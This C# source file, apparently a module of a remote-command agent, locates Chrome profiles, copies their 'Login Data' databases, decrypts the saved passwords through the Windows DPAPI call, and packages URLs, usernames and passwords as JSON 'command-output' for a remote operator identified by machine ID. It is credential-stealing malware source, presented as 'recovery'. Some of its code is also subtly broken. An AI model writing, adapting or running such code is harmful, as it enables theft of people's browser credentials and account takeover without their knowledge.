using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace CSharpSender
{
    public class ChromeRecovery
    {
        [DllImport("crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool CryptUnprotectData(
            ref byte[] pDataIn,
            StringBuilder szDataDescr,
            ref byte[] pOptionalEntropy,
            IntPtr pvReserved,
            ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
            uint dwFlags,
            ref byte[] pDataOut,
            ref int pcbDataOut);

        [StructLayout(LayoutKind.Sequential)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public uint dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        public class ChromePasswordEntry
        {
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Profile { get; set; }
        }

        public class ChromeStatus
        {
            public bool ChromeRunning { get; set; }
            public string ChromeVersion { get; set; }
            public int ProfilesFound { get; set; }
            public string ChromePath { get; set; }
        }

        public static async Task<string> HandleChromeRecoveryCommand(string action, string machineId)
        {
            try
            {
                switch (action)
                {
                    case "chrome-recovery-start":
                        return await StartChromeRecovery(machineId);
                    case "chrome-status-check":
                        return await CheckChromeStatus(machineId);
                    default:
                        return JsonSerializer.Serialize(new { error = "Unknown Chrome recovery action" });
                }
            }
            catch (Exception ex)
            {
                return JsonSerializer.Serialize(new { error = ex.Message });
            }
        }

        private static async Task<string> StartChromeRecovery(string machineId)
        {
            var passwords = new List<ChromePasswordEntry>();
            var profiles = GetChromeProfiles();

            foreach (var profile in profiles)
            {
                try
                {
                    var profilePasswords = RecoverPasswordsFromProfile(profile);
                    passwords.AddRange(profilePasswords.Select(p => new ChromePasswordEntry
                    {
                        Url = p.Url,
                        Username = p.Username,
                        Password = p.Password,
                        Profile = Path.GetFileName(profile)
                    }));
                }
                catch (Exception ex)
                {
                    // Log error but continue with other profiles
                    Console.WriteLine($"Error recovering from profile {profile}: {ex.Message}");
                }
            }

            var response = new
            {
                type = "command-output",
                requestId = "chrome-recovery-result",
                machineId = machineId,
                status = "complete",
                results = passwords,
                count = passwords.Count
            };

            return JsonSerializer.Serialize(response);
        }

        private static async Task<string> CheckChromeStatus(string machineId)
        {
            var status = GetChromeStatus();

            var response = new
            {
                type = "command-output",
                requestId = "chrome-status-result",
                machineId = machineId,
                chrome_running = status.ChromeRunning,
                chrome_version = status.ChromeVersion,
                profiles_found = status.ProfilesFound,
                chrome_path = status.ChromePath
            };

            return JsonSerializer.Serialize(response);
        }

        private static List<string> GetChromeProfiles()
        {
            var profiles = new List<string>();
            var chromePaths = new[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Google\\Chrome\\User Data")
            };

            foreach (var chromePath in chromePaths)
            {
                if (Directory.Exists(chromePath))
                {
                    // Default profile
                    var defaultProfile = Path.Combine(chromePath, "Default");
                    if (Directory.Exists(defaultProfile))
                        profiles.Add(defaultProfile);

                    // Other profiles
                    var profileDir = Path.Combine(chromePath, "Profile");
                    if (Directory.Exists(profileDir))
                    {
                        foreach (var dir in Directory.GetDirectories(profileDir))
                        {
                            profiles.Add(dir);
                        }
                    }
                }
            }

            return profiles;
        }

        private static ChromeStatus GetChromeStatus()
        {
            var status = new ChromeStatus();
            
            // Check if Chrome is running
            var processes = Process.GetProcessesByName("chrome");
            status.ChromeRunning = processes.Length > 0;

            // Get Chrome version from registry
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Google\Update\Clients\{8A69D345-D564-463C-AFF1-A69D9E530F96}"))
                {
                    if (key != null)
                    {
                        status.ChromeVersion = key.GetValue("pv")?.ToString() ?? "Unknown";
                    }
                }
            }
            catch
            {
                status.ChromeVersion = "Unknown";
            }

            // Get Chrome installation path
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"))
                {
                    if (key != null)
                    {
                        status.ChromePath = key.GetValue("")?.ToString() ?? "Unknown";
                    }
                }
            }
            catch
            {
                status.ChromePath = "Unknown";
            }

            // Count profiles
            status.ProfilesFound = GetChromeProfiles().Count;

            return status;
        }

        private static List<(string Url, string Username, string Password)> RecoverPasswordsFromProfile(string profilePath)
        {
            var passwords = new List<(string, string, string)>();
            var loginDataPath = Path.Combine(profilePath, "Login Data");

            if (!File.Exists(loginDataPath))
                return passwords;

            // Create temporary copy to avoid locking issues
            var tempPath = loginDataPath + "_temp";
            File.Copy(loginDataPath, tempPath, true);

            try
            {
                using (var connection = new System.Data.SQLite.SQLiteConnection($"Data Source={tempPath};Version=3;"))
                {
                    connection.Open();
                    var command = new System.Data.SQLite.SQLiteCommand(
                        "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0",
                        connection);

                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var url = reader["origin_url"]?.ToString() ?? "";
                            var username = reader["username_value"]?.ToString() ?? "";
                            var encryptedPassword = (byte[])reader["password_value"];

                            if (!string.IsNullOrEmpty(username) && encryptedPassword != null && encryptedPassword.Length > 0)
                            {
                                var password = DecryptPassword(encryptedPassword);
                                if (!string.IsNullOrEmpty(password))
                                {
                                    passwords.Add((url, username, password));
                                }
                            }
                        }
                    }
                }
            }
            finally
            {
                // Clean up temp file
                if (File.Exists(tempPath))
                    File.Delete(tempPath);
            }

            return passwords;
        }

        private static string DecryptPassword(byte[] encryptedPassword)
        {
            try
            {
                var decrypted = new byte[encryptedPassword.Length];
                var decryptedSize = decrypted.Length;

                var promptStruct = new CRYPTPROTECT_PROMPTSTRUCT
                {
                    cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT)),
                    dwPromptFlags = 0,
                    hwndApp = IntPtr.Zero,
                    szPrompt = null
                };

                if (CryptUnprotectData(
                    ref encryptedPassword,
                    null,
                    ref new byte[0],
                    IntPtr.Zero,
                    ref promptStruct,
                    0,
                    ref decrypted,
                    ref decryptedSize))
                {
                    return Encoding.UTF8.GetString(decrypted, 0, decryptedSize);
                }
            }
            catch
            {
                // Failed to decrypt
            }

            return null;
        }
    }
}
